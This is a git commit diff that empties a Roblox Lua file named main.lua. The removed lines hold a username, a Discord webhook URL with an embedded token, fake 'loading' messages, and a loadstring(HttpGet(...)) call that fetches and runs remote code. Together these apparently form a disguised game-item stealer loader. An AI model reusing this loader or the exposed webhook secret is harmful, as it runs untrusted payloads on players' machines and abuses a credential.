6b982ec170792199dafca2314ca210b83223e71e
Kukinekk <102248249+Kukinekk@users.noreply.github.com>
2023-03-10 16:18:17 +0100

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,9 +1,1 @@
-Username = "0FFK4KYY"
-WebHook = "https://discord.com/api/webhooks/1083718067344908389/AckpoZpK-uXvBCAX0ADYuBrTO2RppdkJkVls3iG3PLMO49faM4iuCYExHeJJNXDH1XeH"
 
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
